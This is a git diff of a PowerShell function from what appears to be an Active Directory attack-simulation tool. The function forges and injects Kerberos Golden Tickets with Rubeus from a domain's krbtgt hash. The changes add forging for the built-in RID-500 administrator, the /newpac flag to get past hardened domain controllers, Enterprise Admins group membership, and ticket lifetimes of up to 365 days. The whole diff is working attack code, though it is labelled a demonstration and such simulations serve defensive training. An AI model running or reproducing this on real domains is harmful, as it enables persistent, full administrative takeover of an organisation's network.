@@ -71,6 +71,7 @@ Function Invoke-GoldenTicketAttack {
     $message = "Enter your choice!"
     $Options = @(
         [pscustomobject] @{ Label = "&User Account"; Help = "Select an existing AD user account from domain/forest"; Value = "Real" },
+        [pscustomobject] @{ Label = "&Built-in Administrator"; Help = "Account with the RID -500"; Value = "RID500" },
         [pscustomobject] @{ Label = "&Fake User"; Help = "Random Fake User account, $ShadowUser"; Value = "Fake" }
     )
     $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
@@ -84,6 +85,24 @@ Function Invoke-GoldenTicketAttack {
         $cn = Convert-FromDNToCN -DistinguishedName $dn
         $id = 6543210
         Write-AS2GoOutput -Type Textmaker -message "Selected Domain" -TM $cn
+    }
+    elseif ($answer -eq "RID500") {
+        $dn = Select-ADObject -Title "Select a domain for the Golden Ticket demonstration" -DomainSelectionOnly
+        If (-not $dn) {
+            Write-AS2GoOutput -Type Info -Message "No domain selected for the Golden Ticket demonstration."
+            return
+        }
+        $cn = Convert-FromDNToCN -DistinguishedName $dn
+        $server = Get-BestDomainController -domain $dn
+        $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match "^$dn" } | Select-Object DomainFQDN, DomainSID, NetBIOSName, IsRootDomain
+        $tempSID = $temp.DomainSID + "-500"
+        
+        $realUser = Get-ADUser -Server $server -identity $tempSID
+        $RID500CN = Convert-FromDNToCN -DistinguishedName $realUser.DistinguishedName
+
+        $ShadowUser = $realUser.SamAccountName
+        $id = 500
+        Write-AS2GoOutput -Type Textmaker -message "Selected Account" -TM "$($RID500CN)"
     }
     else {
         $dn = Select-ADObject -Title "Select an user for the Golden Ticket demonstration" -IncludeUsers -MarkTier0 -BlockOUSelection
@@ -165,7 +184,7 @@ Function Invoke-GoldenTicketAttack {
         $groups = "512,513,518,519"
     }
     else {
-        $groups = "512,513"
+        $groups = "512,513,519"
     }
 
     If (-not $SkipClearHost) { Clear-Host }
@@ -182,16 +201,39 @@ Function Invoke-GoldenTicketAttack {
         $forgeHashType = "/rc4:"
     }
 
-    Write-AS2GoOutput -Type Info -Message "Rubeus forges the Golden Ticket with the PAC_REQUESTOR structure and domain-policy ticket lifetimes. Hardened Domain Controllers (KB5008380/KB5020805) reject Mimikatz-forged tickets without this structure (KDC_ERR_TGT_REVOKED)."
+    Write-AS2GoOutput -Type Info -Message "Rubeus forges the Golden Ticket with the PAC_REQUESTOR structure and domain-policy ticket lifetimes.`n      Hardened Domain Controllers (KB5008380/KB5020805) reject Mimikatz-forged tickets without this structure (KDC_ERR_TGT_REVOKED)."
 
     Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
-    Write-Highlight -Text ".\Rubeus.exe ", "golden", " /user:", $ShadowUser, " /id:", $id, " /sid:", $Script:ASDomainSID, " $forgeHashType", $forgeHash, " /domain:", $Script:ASFQDN, " /startoffset:-10 ", " /outfile:", $forgeTicketFile `
+    Write-Highlight -Text ".\Rubeus.exe ", "golden", " /user:", $ShadowUser, " /id:", $id, " /sid:", $Script:ASDomainSID, " /newpac $forgeHashType", $forgeHash, " /domain:", $Script:ASFQDN, " /startoffset:-10 ", " /outfile:", $forgeTicketFile `
         -Color $fgcC, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
 
     $answer = Show-DecisionPrompt
     
         
     If ($answer -eq $Script:Yes) {
+
+        $i = 7
+        If (-not $UnAttended) {
+            $lifetimeOptions = @(
+                [pscustomobject] @{ Label = "&Use 7 days"; Help = "Use the default Golden Ticket lifetime"; Value = 7 },
+                [pscustomobject] @{ Label = "&Custom lifetime"; Help = "Enter a custom lifetime between 8 and 365 days"; Value = "Custom" }
+            )
+            $selectedLifetime = Show-DecisionPrompt -Title "Select the Golden Ticket lifetime" -Message "Choose the ticket validity period." -Options $lifetimeOptions -Default 0
+
+            If ($selectedLifetime -eq "Custom") {
+                While ($true) {
+                    $customLifetime = Read-Host "`n  Please enter a value between 8 and 365"
+                    If ($customLifetime -match '^\d+$') {
+                        $customLifetime = [int]$customLifetime
+                        If ($customLifetime -ge 8 -and $customLifetime -le 365) {
+                            $i = $customLifetime
+                            break
+                        }
+                    }
+                    Write-AS2GoOutput -Type Warning -Message "Invalid input. Only whole numbers between 8 and 365 are allowed."
+                }
+            }
+        }
 
         Remove-Item $forgeTicketFile -ErrorAction SilentlyContinue
 
@@ -200,10 +242,11 @@ Function Invoke-GoldenTicketAttack {
             "/user:$ShadowUser",
             "/id:$id",
             "/sid:$Script:ASDomainSID",
+            "/newpac",
             "$forgeHashType$forgeHash",
             "/domain:$Script:ASFQDN",
             "/startoffset:-10",
-            "/endtime:11d",
+            "/endtime:$i`d",
             "/outfile:$forgeTicketFile"
         )
 
@@ -216,13 +259,12 @@ Function Invoke-GoldenTicketAttack {
         }
 
         Write-AS2GoOutput -type Success -Message "Golden ticket for '$ShadowUser' forged and saved to '$forgeTicketFile'."
-        set-ASConfig -Setting "ASP07KR" -Value "$($Script:ASFQDN)|$($ShadowUser)|$($Script:ASKrbtgtNtml)|$($groups)|$($Script:ASDomainSID)" -DPAPI
+        set-ASConfig -Setting "ASP07KR" -Value "$($Script:ASFQDN)|$($ShadowUser)|$($id)|$($Script:ASKrbtgtNtml)|$($groups)|$($Script:ASDomainSID)" -DPAPI
 
         
         if (-not $unattended) { Pause }
         If (-not $SkipClearHost) { Clear-Host }
          
-        
         Write-AS2GoOutput -type Header -message "Validate and inject the Golden Ticket"
         Set-NewColorSchema -NewStage $Script:GoldenTicket
         $validated = Import-KirbiFile -TicketFile $forgeTicketFile -Service "cifs/$server" -DomainController $server
